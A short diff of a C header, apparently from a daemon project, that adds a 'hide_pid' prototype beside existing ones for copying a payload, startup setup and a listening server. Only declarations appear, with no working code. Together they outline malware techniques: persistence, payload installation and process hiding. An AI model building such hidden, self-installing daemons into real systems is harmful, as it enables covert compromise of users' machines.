@@ -70,6 +70,7 @@ bool        init_server(t_daemon *daemon);
 void        ft_daemonize(void);
 void        copy_payload(void);
 void        startup_setup(void);
+void        hide_pid(void);
 void        create_lock_file(t_daemon *daemon);
 void        init_pollfd(t_daemon *daemon);
 void        server_listen(t_daemon *daemon);
